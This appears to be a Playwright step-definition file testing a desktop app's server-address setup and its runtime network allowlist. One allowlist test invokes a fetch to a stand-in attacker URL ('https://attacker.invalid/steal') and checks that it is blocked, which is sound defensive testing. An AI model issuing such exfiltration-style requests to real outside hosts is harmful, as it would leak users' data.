/**
 * Step definitions for packages/test-specs/features/desktop/config/server-address.feature
 * (#738 desktop server address configuration, #739 runtime network allowlist).
 *
 * `isPackagedTauri()` (src/client/lib/api-config.ts) is false for every OTHER
 * desktop scenario in this suite — they run under the Playwright IPC mock,
 * which satisfies `isTauriRuntime()` but not `isPackagedTauri()`, so the
 * first-run server-address gate never appears for them. These steps opt a
 * scenario INTO packaged-app behavior via `window.__TEST_SIMULATE_PACKAGED_TAURI__`,
 * set through `page.addInitScript` (persists across reloads) or a live
 * `page.evaluate` (does not survive a reload — used deliberately in the
 * "change from settings" scenario, see the step below for why).
 */
import { expect } from '@playwright/test'
import { Given, When, Then, After } from '../fixtures'
import { TestIds } from '../../test-ids'
import { Timeouts } from '../../helpers'
import { startTestBackendServer, type TestBackendServer } from './test-backend-server'

// Scenario-scoped server registry, keyed by the `page` fixture instance (each
// scenario gets a fresh `page`, so this never leaks across scenarios) — avoids
// having to add a new fixture to the shared tests/steps/fixtures.ts, which
// other in-flight workers are actively editing for unrelated work.
const serversByPage = new WeakMap<object, TestBackendServer[]>()

function trackServer(page: object, server: TestBackendServer): void {
  const list = serversByPage.get(page) ?? []
  list.push(server)
  serversByPage.set(page, list)
}

function lastServer(page: object): TestBackendServer {
  const list = serversByPage.get(page)
  const server = list?.[list.length - 1]
  if (!server) throw new Error('No test backend server has been started for this scenario')
  return server
}

After(async ({ page }) => {
  const list = serversByPage.get(page)
  list?.forEach(s => s.close())
})

// --- Simulating a packaged desktop build ---

Given('the desktop app is simulating a packaged build with no server configured', async ({ page }) => {
  // Registered before any navigation — Playwright re-runs init scripts on
  // every subsequent navigation/reload of this page, matching how a real
  // packaged app's "am I Tauri" check would stay true across reloads.
  await page.addInitScript(() => {
    (window as unknown as Record<string, unknown>).__TEST_SIMULATE_PACKAGED_TAURI__ = true
  })
})

Given('the desktop app is now simulating a packaged build', async ({ page }) => {
  // Deliberately NOT addInitScript: this fires AFTER an admin has already
  // logged in against the default (relative /api) backend. We want the
  // Settings "Server address" section to become visible for THIS page state
  // only — the later window.location.reload() in this scenario is expected
  // to drop the simulation (a real reload of a real packaged app doesn't stop
  // being packaged, but re-arming that for every reload isn't needed to prove
  // the behavior this scenario cares about: saving a new address actually
  // redirects traffic there and clears the old session).
  await page.evaluate(() => {
    (window as unknown as Record<string, unknown>).__TEST_SIMULATE_PACKAGED_TAURI__ = true
  })
})

// --- Test backend server lifecycle ---

Given('a real test backend server is running', async ({ page }) => {
  trackServer(page, await startTestBackendServer())
})

// --- Navigation ---

When('I load the app', async ({ page }) => {
  await page.goto('/')
})

// "I reload the page" is defined in tests/steps/auth/auth-guards-steps.ts (page.reload()) — reused as-is.

// --- First-run / server address screen ---

Then('I should see the server address screen', async ({ page }) => {
  await expect(page.getByTestId(TestIds.SERVER_ADDRESS_TITLE)).toBeVisible({ timeout: Timeouts.ELEMENT })
})

Then('I should still see the server address screen', async ({ page }) => {
  await expect(page.getByTestId(TestIds.SERVER_ADDRESS_TITLE)).toBeVisible({ timeout: Timeouts.ELEMENT })
})

Then('I should not see the server address screen', async ({ page }) => {
  await expect(page.getByTestId(TestIds.SERVER_ADDRESS_TITLE)).not.toBeVisible()
})

Then('I should see the server address input', async ({ page }) => {
  await expect(page.getByTestId(TestIds.SERVER_ADDRESS_INPUT)).toBeVisible()
})

Then('I should see a server address error', async ({ page }) => {
  await expect(page.getByTestId(TestIds.SERVER_ADDRESS_ERROR)).toBeVisible({ timeout: Timeouts.API })
})

When('I enter {string} as the server address and submit', async ({ page }, address: string) => {
  await page.getByTestId(TestIds.SERVER_ADDRESS_INPUT).fill(address)
  await page.getByTestId(TestIds.SERVER_ADDRESS_SUBMIT).click()
})

When("I enter the test backend server's address and submit", async ({ page }) => {
  const server = lastServer(page)
  await page.getByTestId(TestIds.SERVER_ADDRESS_INPUT).fill(server.origin)
  await page.getByTestId(TestIds.SERVER_ADDRESS_SUBMIT).click()
})

Given('I have configured that server and reached the login screen', async ({ page }) => {
  await page.goto('/')
  const server = lastServer(page)
  await page.getByTestId(TestIds.SERVER_ADDRESS_INPUT).fill(server.origin)
  await page.getByTestId(TestIds.SERVER_ADDRESS_SUBMIT).click()
  await page.waitForURL(/\/login/, { timeout: Timeouts.AUTH })
})

Then('I should be on the login screen', async ({ page }) => {
  await page.waitForURL(/\/login/, { timeout: Timeouts.AUTH })
})

Then('the test backend server should have received a request to {string}', async ({ page }, path: string) => {
  const server = lastServer(page)
  await expect.poll(
    () => server.requests.some(r => r.path === path),
    { timeout: Timeouts.API },
  ).toBe(true)
})

// --- Runtime allowlist enforcement (#739) ---

interface BlockResult { blocked: boolean; message?: string }
const blockResultByPage = new WeakMap<object, BlockResult>()

When('the app attempts a network request to an unconfigured origin', async ({ page }) => {
  const result = await page.evaluate(async () => {
    const invokeSymbol = Symbol.for('llamenos_test_invoke')
    const invoke = (window as unknown as Record<symbol, unknown>)[invokeSymbol] as
      (cmd: string, args?: Record<string, unknown>) => Promise<unknown>
    try {
      await invoke('net_fetch', {
        method: 'GET',
        url: 'https://attacker.invalid/steal',
        headers: {},
        bodyBase64: null,
      })
      return { blocked: false }
    } catch (err) {
      return { blocked: true, message: err instanceof Error ? err.message : String(err) }
    }
  })
  blockResultByPage.set(page, result)
})

Then('the request is blocked by the runtime allowlist', async ({ page }) => {
  const result = blockResultByPage.get(page)
  expect(result?.blocked).toBe(true)
  expect(result?.message).toMatch(/blocked/i)
})

// --- Changing the address later from Settings ---

When('I open the settings server address section', async ({ page }) => {
  await page.goto('/settings?section=server-connection')
})

When('I enter the test backend server\'s address and save', async ({ page }) => {
  const server = lastServer(page)
  await page.getByTestId(TestIds.SETTINGS_SERVER_ADDRESS_INPUT).fill(server.origin)
  await page.getByTestId(TestIds.SETTINGS_SERVER_ADDRESS_SUBMIT).click()
})

Then('the app reloads and requests land on the test backend server', async ({ page }) => {
  const server = lastServer(page)
  // The settings save handler calls window.location.reload(). Poll directly
  // rather than waiting on a load-state event first — waiting on
  // 'domcontentloaded' here can race the reload and resolve against the
  // page's PRE-reload state; polling the server's request log is immune to
  // that race and succeeds as soon as the reloaded app's ConfigProvider fires.
  await expect.poll(
    () => server.requests.some(r => r.path === '/api/config'),
    { timeout: Timeouts.API },
  ).toBe(true)
})

Then('my session is cleared', async ({ page }) => {
  const sessionToken = await page.evaluate(() => sessionStorage.getItem('llamenos-session-token'))
  expect(sessionToken).toBeNull()
  const unlocked = await page.evaluate(async () => {
    const km = (window as unknown as Record<string, unknown>).__TEST_KEY_MANAGER as { isUnlocked: () => boolean }
    return km.isUnlocked()
  })
  expect(unlocked).toBe(false)
})
